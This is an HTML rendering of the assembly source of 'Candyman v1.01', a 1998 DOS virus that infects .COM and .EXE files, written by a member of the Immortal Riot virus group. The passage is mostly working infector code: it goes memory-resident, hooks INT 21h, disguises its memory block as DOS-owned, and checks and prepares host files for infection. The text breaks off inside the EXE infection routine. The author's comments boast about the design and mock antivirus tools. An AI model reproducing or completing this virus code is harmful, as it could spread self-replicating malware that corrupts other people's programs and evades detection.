<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Candy.999 - CANDYMAN.ASM.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;============================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     NAME: Candyman v1.01</span><span class="sc0">
</span><span class="sc1">;     TYPE: Full-mirror .COM &amp; .EXE-infector.</span><span class="sc0">
</span><span class="sc1">;     SIZE: 999 bytes.</span><span class="sc0">
</span><span class="sc1">;     DATE: October - November 1998.</span><span class="sc0">
</span><span class="sc1">;   AUTHOR: T-2000 / [Immortal Riot].</span><span class="sc0">
</span><span class="sc1">;   E-MAIL: T2000_@hotmail.com</span><span class="sc0">
</span><span class="sc1">;  PAYLOAD: Nope, it's completely harmless.</span><span class="sc0">
</span><span class="sc1">;      CPU: 286+</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; After coding tons of conventional virii I felt like making something more</span><span class="sc0">
</span><span class="sc1">; original, quickly was decided for a mirror-type virus since there are only</span><span class="sc0">
</span><span class="sc1">; two more of these ever written (Mirror &amp; Total Trash). The main difference</span><span class="sc0">
</span><span class="sc1">; between these two and my Candyman is the fact that Candyman works 100%</span><span class="sc0">
</span><span class="sc1">; independant, ie. it doesn't need any SFT's (Mirror), nor it doesn't have to</span><span class="sc0">
</span><span class="sc1">; maintain it's own filetables (Total Trash), this doesn't have to mean that</span><span class="sc0">
</span><span class="sc1">; Candyman is more viable in the wild, but in general it's more compatible</span><span class="sc0">
</span><span class="sc1">; with all the different DOS'es around.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; CAPABILITIES:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       - Full-mirror (network compatible).</span><span class="sc0">
</span><span class="sc1">;       - Uses UMBs if available.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; NOD-Ice seems to be the only program which jams with Candyman resident, who</span><span class="sc0">
</span><span class="sc1">; cares, the bloody AV causes goddamn parity-errors all the time at my comp!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;      ... And don't fuck around with the mirror, coz he *WILL* come...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;============================================================================</span><span class="sc0">


                </span><span class="sc9">.MODEL</span><span class="sc0">  </span><span class="sc10">TINY</span><span class="sc0">
                </span><span class="sc9">.STACK</span><span class="sc0">  </span><span class="sc2">512</span><span class="sc0">
                </span><span class="sc2">.286</span><span class="sc0">
                </span><span class="sc9">.CODE</span><span class="sc0">


</span><span class="sc5">Virus_Size</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">Virus_End</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Virus_Size_Mem</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc5">Virus_End_Mem</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">Residency_Check</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0CA01h</span><span class="sc0">
</span><span class="sc5">Marker_Mem</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">1998h</span><span class="sc0">
</span><span class="sc5">Marker_File</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">9691h</span><span class="sc0">
</span><span class="sc5">Min_Size_Infect</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">560</span><span class="sc0">
</span><span class="sc5">Lady_Di</span><span class="sc0">         </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0DEADh</span><span class="sc0">  </span><span class="sc1">; She took her name a bit TOO seriously, heh.</span><span class="sc0">


</span><span class="sc5">START</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Get_Delta</span><span class="sc0">               </span><span class="sc1">; Get our position in memory.</span><span class="sc0">
</span><span class="sc5">Anti_Debugger</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">Get_Delta</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Anti_Debugger</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc4">)</span><span class="sc0">

                </span><span class="sc6">PUSHA</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">                      </span><span class="sc1">; Save our PSP-segment.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Residency_Check</span><span class="sc0">     </span><span class="sc1">; Request residency-status.</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Marker_Mem</span><span class="sc0">          </span><span class="sc1">; It's there? then abort</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Exec_Host</span><span class="sc0">               </span><span class="sc1">; further TSR-installation.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5802h</span><span class="sc0">               </span><span class="sc1">; Get UMB link-status.</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">CBW</span><span class="sc0">                             </span><span class="sc1">; Save status at the stack.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5803h</span><span class="sc0">               </span><span class="sc1">; Add UMBs to memory-chain.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5800h</span><span class="sc0">               </span><span class="sc1">; Get allocation-strategy.</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; Save strategy on stack.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5801h</span><span class="sc0">               </span><span class="sc1">; Set allocation strategy,</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; first fit, start with UMBs.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Try_Alloc_Mem</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc0">                 </span><span class="sc1">; Try to allocate the needed</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size_Mem</span><span class="sc0">      </span><span class="sc1">; memory.</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">JNC</span><span class="sc0">     </span><span class="sc5">Copy_Virus_Up</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">                 </span><span class="sc1">; Get size of current block.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4Ah</span><span class="sc0">                 </span><span class="sc1">; Resize block.</span><span class="sc0">
                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size_Mem</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Try_Alloc_Mem</span><span class="sc0">           </span><span class="sc1">; Let's try again...</span><span class="sc0">

</span><span class="sc5">Copy_Virus_Up</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; Our allocated block.</span><span class="sc0">

                </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; Get MCB of allocated block.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">

                </span><span class="sc1">; Disguise our block.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">DI.MCB_PSP</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">       </span><span class="sc1">; Owner is DOS.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">DI.MCB_Program</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'CS'</span><span class="sc0">  </span><span class="sc1">; System-code.</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; Restore allocation-</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">; strategy (AX=5801h).</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">                      </span><span class="sc1">; Restore UMB link-state,</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">; (AX=5803h).</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">          </span><span class="sc1">; Copy virus to allocated</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">                             </span><span class="sc1">; memory.</span><span class="sc0">
                </span><span class="sc5">SEGCS</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3521h</span><span class="sc0">               </span><span class="sc1">; Get address INT 21h.</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Int21h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">              </span><span class="sc1">; Save address INT 21h.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Int21h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">25h</span><span class="sc0">                 </span><span class="sc1">; Hook INT 21h.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NewInt21h</span><span class="sc0">
                </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Exec_Host</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">                      </span><span class="sc1">; PSP of our host.</span><span class="sc0">
                </span><span class="sc6">POPA</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Host_Bytes</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.EXE_Mark</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">     </span><span class="sc1">; Determine host-type.</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Exec_EXE</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">                </span><span class="sc1">; Restore original bytes.</span><span class="sc0">
                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">24</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSW</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">

                </span><span class="sc6">RETN</span><span class="sc0">                            </span><span class="sc1">; Pass control to .COM-host.</span><span class="sc0">


</span><span class="sc5">Exec_EXE</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">                  </span><span class="sc1">; Get effective segment.</span><span class="sc0">
                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Program_CS</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">     </span><span class="sc1">; Add effective segment.</span><span class="sc0">

                </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SI.Program_SS</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get original SS.</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">                      </span><span class="sc1">; Restore DS.</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">CLI</span><span class="sc0">                             </span><span class="sc1">; Restore .EXE-stack.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SI.Program_SP</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">STI</span><span class="sc0">

                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">

                </span><span class="sc1">; Pass control to .EXE-host.</span><span class="sc0">

                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc5">SI.Program_IP</span><span class="sc4">]</span><span class="sc0">


                </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'Speak my name 5 times in front of a mirror...'</span><span class="sc0">


</span><span class="sc1">; Returns CF set when handle in BX is not appropriate for infection.</span><span class="sc0">
</span><span class="sc5">Check_Handle_Inf</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SP</span><span class="sc0">                  </span><span class="sc1">; Load BP with SP.</span><span class="sc0">

                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">                      </span><span class="sc1">; Adjust value, (coz we</span><span class="sc0">
                </span><span class="sc6">INC</span><span class="sc0">     </span><span class="sc8">BP</span><span class="sc0">                      </span><span class="sc1">; CALLed this routine).</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4201h</span><span class="sc0">               </span><span class="sc1">; Get current file-position</span><span class="sc0">
                </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">                  </span><span class="sc1">; of handle in BX.</span><span class="sc0">
                </span><span class="sc6">CWD</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">File_Pos_Lo</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">         </span><span class="sc1">; Save original fileposition.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">File_Pos_Hi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4400h</span><span class="sc0">               </span><span class="sc1">; Get handle-info.</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc0">                  </span><span class="sc1">; Abort when it's not a file.</span><span class="sc0">
                </span><span class="sc6">JS</span><span class="sc0">      </span><span class="sc5">JNE_Bad_Handle</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_EOF</span><span class="sc0">                  </span><span class="sc1">; Get filesize.</span><span class="sc0">

                </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">                  </span><span class="sc1">; It's bigger than 64k ?</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Read_Header</span><span class="sc0">             </span><span class="sc1">; Yeah? that's OK.</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Min_Size_Infect</span><span class="sc0">     </span><span class="sc1">; It's big enough?</span><span class="sc0">
                </span><span class="sc6">JB</span><span class="sc0">      </span><span class="sc5">JNE_Bad_Handle</span><span class="sc0">

</span><span class="sc5">Read_Header</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_BOF</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Header</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">                 </span><span class="sc1">; Read header.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">OldInt21h</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Host_Bytes</span><span class="sc0">   </span><span class="sc1">; Save original header.</span><span class="sc0">
                </span><span class="sc6">CLD</span><span class="sc0">
                </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">

                </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Checksum</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Marker_File</span><span class="sc0">   </span><span class="sc1">; Already infected?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Bad_Handle</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.EXE_Mark</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ZM'</span><span class="sc0">     </span><span class="sc1">; It's an .EXE-file?</span><span class="sc0">
                </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Mirror_EXE</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Jump</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">         </span><span class="sc1">; Most .COM-files start</span><span class="sc0">
</span><span class="sc5">JNE_Bad_Handle</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Bad_Handle</span><span class="sc0">              </span><span class="sc1">; with a 16-bit JMP.</span><span class="sc0">

</span><span class="sc5">Mirror_COM</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">                  </span><span class="sc1">; Can't be greater than 64k.</span><span class="sc0">
                </span><span class="sc6">JNZ</span><span class="sc0">     </span><span class="sc5">Bad_Handle</span><span class="sc0">

                </span><span class="sc1">; .COM isn't too big?</span><span class="sc0">

                </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">65535</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc4">))</span><span class="sc0">
                </span><span class="sc6">JA</span><span class="sc0">      </span><span class="sc5">Bad_Handle</span><span class="sc0">

                </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                   </span><span class="sc1">; Calculate displacement.</span><span class="sc0">

                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SI.Displacement</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; Store displacement, the</span><span class="sc0">
                                                </span><span class="sc1">; JMP is already present.</span><span class="sc0">
                </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Good_Handle</span><span class="sc0">

</span><span class="sc5">Mirror_EXE</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">SI.Header_Size_Mem</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Calculate headersize.</span><span class="sc0">
                </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
                </span><span class="sc6">MUL</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">

                </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">

                </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">

                </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Go_EOF</span><span class="sc0">

